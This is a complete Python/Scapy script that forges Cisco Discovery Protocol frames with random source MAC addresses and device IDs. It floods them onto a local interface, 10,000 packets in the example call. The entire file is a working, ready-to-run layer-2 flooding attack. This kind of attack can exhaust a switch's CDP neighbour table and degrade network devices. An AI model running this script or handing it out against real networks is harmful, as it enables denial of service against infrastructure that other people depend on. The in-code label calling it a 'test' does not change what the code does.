from scapy.all import *
from scapy.layers.l2 import *

# Create a single CDP frame
def create_cdp_packet():
    return (
        Ether(dst="01:00:0c:cc:cc:cc", src=RandMAC()) /  # Random source MAC address
        LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /  # LLC header
        SNAP(OUI=0x00000c, code=0x2000) /  # SNAP header
        CDP(version=2, ttl=180) /  # CDP header with TTL
        CDPMsgDeviceID(val=RandString(10)) /  # Random Device ID TLV
        CDPMsgSoftwareVersion(val="Scapy Test CDP Flood") /  # Software Version TLV
        CDPMsgPlatform(val="Scapy Generated")  # Platform TLV
    )

# Flooding with CDP packets
def cdp_flood(iface, count=1000):
    for _ in range(count):
        pkt = create_cdp_packet()
        sendp(pkt, iface=iface, verbose=False)

# Example usage: replace 'eth0' with your network interface
cdp_flood(iface="eth0", count=10000)  # Sends 10,000 CDP packets

